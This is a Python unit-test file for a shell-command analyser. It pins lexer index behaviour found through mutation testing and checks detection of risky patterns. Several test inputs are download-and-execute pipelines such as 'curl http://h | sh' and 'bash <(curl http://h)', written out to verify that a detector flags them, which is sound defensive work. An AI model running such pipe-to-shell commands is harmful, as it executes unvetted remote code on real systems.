"""Index arithmetic of the shell lexer, pinned one position at a time.

The whole-module mutation run of `shell_syntax` (docs/MUTATION.md) left 70
survivors, most of them off-by-one mutants in the quote and substitution
scanners that no behavioural test observed, plus a family of `return "", True`
flips that would make a harmless downstream command "read code from stdin".
Each test here asserts the exact index, token or verdict for the smallest
input that exposes the mutant; the margin names the site.
"""
from __future__ import annotations

import unittest

from falsicore.shell_syntax import (
    Command, Word, _Analysis, _Unterminated, _backtick_end, _balanced, _dollar, _double_quote_end, _lex, analyze,
)


class Balanced(unittest.TestCase):
    def test_escaped_closer_is_skipped_exactly_once(self):                 # _balanced: i += 2
        self.assertEqual(_balanced("(x \\))", 1), 6)
        with self.assertRaises(_Unterminated):
            _balanced("(x \\)", 1)

    def test_empty_single_quotes_end_where_they_start(self):               # find("'", i + 1); i = j + 1
        self.assertEqual(_balanced("('')", 1), 4)
        self.assertEqual(_balanced("('a)b')", 1), 7)

    def test_double_quoted_substitution_inside(self):                       # _double_quote_end: _balanced(text, i + 2)
        self.assertEqual(_balanced('("$()")', 1), 7)


class DoubleQuoteEnd(unittest.TestCase):
    def test_substitution_opens_right_after_the_dollar(self):              # _balanced(text, i + 2)
        self.assertEqual(_double_quote_end('"$()"', 1), 5)

    def test_backtick_scan_starts_right_after_the_backtick(self):          # _backtick_end(text, i + 1)
        self.assertEqual(_double_quote_end('"``"', 1), 4)
        self.assertEqual(_double_quote_end('"`x"y`"', 1), 7)


class BacktickEnd(unittest.TestCase):
    def test_escaped_backtick_is_skipped_and_the_scan_continues(self):     # i += 2; continue
        self.assertEqual(_backtick_end("\\``", 0), 3)
        self.assertEqual(_backtick_end("\\x`", 0), 3)


class Dollar(unittest.TestCase):
    def test_arithmetic_expansion_consumes_both_parentheses(self):         # _balanced(text, i + 2)
        w = Word("", 1)
        self.assertEqual(_dollar("$((1+2))x", 0, w), 8)
        self.assertEqual((w.text, w.expands), ("\x00ARITH\x00", True))

    def test_command_substitution_body_and_end(self):                      # end = _balanced(text, i + 2); text[i + 2:end - 1]
        w = Word("", 1)
        self.assertEqual(_dollar("$(x)", 0, w), 4)
        self.assertEqual((w.subs, w.expands, w.text), (["x"], True, "\x00SUB\x00"))
        w = Word("", 1)
        self.assertEqual(_dollar("$()", 0, w), 3)
        self.assertEqual(w.subs, [""])

    def test_braced_variable(self):                                        # _balanced(text, i + 2, "{", "}"); expands
        w = Word("", 1)
        self.assertEqual(_dollar("${}", 0, w), 3)
        self.assertEqual(w.text, "\x00VAR:?\x00")
        w = Word("", 1)
        self.assertEqual(_dollar("${HOME}/x", 0, w), 7)
        self.assertEqual((w.text, w.expands), ("\x00VAR:HOME\x00", True))
        self.assertEqual(analyze("${CMD} --arg")["unresolved_expansions"], 1)

    def test_ansi_c_quoting(self):                                         # j = i + 2; j += 2; quoted; return j + 1
        w = Word("", 1)
        self.assertEqual(_dollar("$''x", 0, w), 3)
        self.assertEqual((w.text, w.quoted, w.expands), ("", True, False))
        w = Word("", 1)
        self.assertEqual(_dollar("$'\\''", 0, w), 5)
        self.assertEqual(w.text, "\\'")
        w = Word("", 1)
        self.assertEqual(_dollar("$'a'b", 0, w), 4)
        self.assertEqual(w.text, "a")
        with self.assertRaises(_Unterminated):
            _dollar("$'a", 0, Word("", 1))


class Lexer(unittest.TestCase):
    def test_single_quoted_word_is_quoted(self):                           # w.quoted = True
        [w] = _lex("'x'", set())
        self.assertEqual((w.text, w.quoted, w.expands), ("x", True, False))

    def test_double_quote_escapes(self):                                   # inner[k + 1:k + 2]; w.text += inner[k + 1]; k += 2
        self.assertEqual(_lex('"a\\""', set())[0].text, 'a"')
        self.assertEqual(_lex('"\\x"', set())[0].text, "\\x")
        self.assertEqual(_lex('"\\$ab"', set())[0].text, "$ab")
        self.assertEqual(_lex('"\\\\"', set())[0].text, "\\")

    def test_backtick_inside_double_quotes(self):                          # _backtick_end(inner, k + 1); inner[k + 1:j - 1]; expands
        gaps: set[str] = set()
        [w] = _lex('"``"', gaps)
        self.assertEqual((w.subs, w.expands, gaps), ([""], True, set()))
        [w] = _lex('"`x`"', set())
        self.assertEqual((w.subs, w.text), (["x"], "\x00SUB\x00"))

    def test_bare_backtick(self):                                          # text[i + 1:j - 1]; expands
        [w] = _lex("`x`", set())
        self.assertEqual((w.subs, w.expands, w.text), (["x"], True, "\x00SUB\x00"))

    def test_process_substitution_tokens(self):                            # _balanced(text, i + 2); flush(); text[i + 2:end - 1]
        tokens = _lex("x<(y)", set())
        self.assertEqual([type(t).__name__ for t in tokens], ["Word", "Op"])
        self.assertEqual((tokens[1].op, tokens[1].body), ("procsub<", "y"))
        self.assertEqual(_lex("cat <()", set())[1].body, "")
        gaps: set[str] = set()
        self.assertEqual([t.text for t in _lex("x<(", gaps)], ["x"])
        self.assertEqual(gaps, {"UNPARSED_QUOTING"})

    def test_heredoc_delimiter_scanning(self):                             # while i < n; i += 1; m.group(3)
        self.assertEqual(analyze("cat <<")["limitations"], ["UNPARSED_QUOTING"])
        self.assertEqual(analyze("cat << EOF\nx\nEOF\n")["limitations"], [])
        self.assertEqual(analyze("cat <<'EOF'\n$x\nEOF\n")["limitations"], [])
        self.assertEqual(analyze("cat <<\\EOF\n$x\nEOF\n")["limitations"], [])
        self.assertEqual(analyze("cat <<EOF\n$x\nEOF\n")["limitations"], [])
        self.assertEqual(analyze("python3 - <<EOF\necho $x\nEOF\n")["limitations"], ["HEREDOC_EXPANSION_NOT_RESOLVED"])
        self.assertEqual(analyze("python3 - <<'EOF'\necho $x\nEOF\n")["limitations"], [])

    def test_heredoc_body_is_the_lines_between(self):                      # i = min(end + 1, n)
        doc = _lex("cat <<EOF\na\nb\nEOF\n", set())[1]
        self.assertEqual((doc.op, doc.body), ("<<", "a\nb"))
        doc = _lex("cat <<-EOF\n\ta\n\tEOF\n", set())[1]
        self.assertEqual(doc.body, "\ta")

    def test_heredoc_body_lines_advance_the_line_counter(self):            # line += 1
        self.assertEqual(analyze("cat <<EOF\na\nb\nEOF\n/tmp/x\n")["matches"],
                         [{"line": 5, "patterns": ["TEMP_PATH_IN_EXECUTION"]}])


class Bounds(unittest.TestCase):
    """The documented limits, as numbers: a test that read the constant would move with it."""

    def test_input_limit_is_131072_characters(self):
        self.assertEqual(analyze("#" + "x" * 131071)["limitations"], [])
        self.assertEqual(analyze("#" + "x" * 131072)["limitations"], ["INPUT_LIMIT"])

    def test_nesting_limit_is_depth_4(self):
        self.assertEqual(analyze("true", depth=4)["limitations"], [])
        self.assertEqual(analyze("true", depth=5)["limitations"], ["NESTING_LIMIT"])

    def test_token_limit_is_8192(self):
        self.assertEqual(analyze("a " * 8192 + "b")["limitations"], [])
        self.assertEqual(analyze("a " * 8193 + "b")["limitations"], ["TOKEN_LIMIT"])


class StdinCodeIsClaimedOnlyByInterpreters(unittest.TestCase):
    """`curl … | X` is a download executed only when X reads code from stdin."""

    def test_downstream_commands_that_do_not_run_their_input(self):
        for tail in ("X=1", "nohup", "fi", "echo", "alias x=y", "export X=1", "trap 'x' INT", "source x", ". x",
                     "eval true", "python3 -m json.tool", "python3 s.py", "python3 -c 1", "sh -c", "sh -c true",
                     "grep x", "powershell -EncodedCommand x", "cat"):
            self.assertNotIn("REMOTE_SCRIPT_PIPELINE", analyze(f"curl http://h | {tail}")["patterns"], tail)

    def test_downstream_commands_that_do(self):
        for tail in ("sh", "bash -s", "python3", "python3 -", "sudo sh", "perl"):
            self.assertIn("REMOTE_SCRIPT_PIPELINE", analyze(f"curl http://h | {tail}")["patterns"], tail)

    def test_script_operand_classification_returns_a_bool(self):           # return False
        self.assertIs(_Analysis(0)._script_operand([Word("s.py", 1)], [], 1, Command()), False)

    def test_here_string_and_input_redirection_feed_the_interpreter(self):  # op == "<<<" and …; nested(target.text)
        self.assertEqual(analyze("sh -s <<< 'curl http://h | sh'")["patterns"], ["REMOTE_SCRIPT_PIPELINE"])
        self.assertEqual(analyze("sh -c 'curl http://h | sh'")["patterns"], ["REMOTE_SCRIPT_PIPELINE"])
        self.assertEqual(analyze("python3 - >/tmp/out <<EOF\nprint(1)\nEOF\n")["patterns"], [])
        self.assertEqual(analyze("python3 - 2>/tmp/err < script.py")["patterns"], [])
        self.assertEqual(analyze("python3 - < script.py")["limitations"], [])
        self.assertEqual(analyze("python3 - < $F")["limitations"], ["EXPANSION_NOT_RESOLVED"])

    def test_process_substitution_operands_are_numbered_in_order(self):    # "\x00PROCSUB%d\x00" % (len(cmd.procsubs) - 1)
        self.assertEqual(analyze("bash <(echo) <(curl http://h)")["patterns"], [])
        self.assertEqual(analyze("bash <(curl http://h) <(echo)")["patterns"], ["REMOTE_SCRIPT_PIPELINE"])

    def test_source_operands_are_recorded_once(self):
        self.assertEqual(analyze("source ~/.x\n. $HOME/.y\n")["sourced"], ["~/.x", "\x00VAR:HOME\x00/.y"])


if __name__ == "__main__":
    unittest.main()
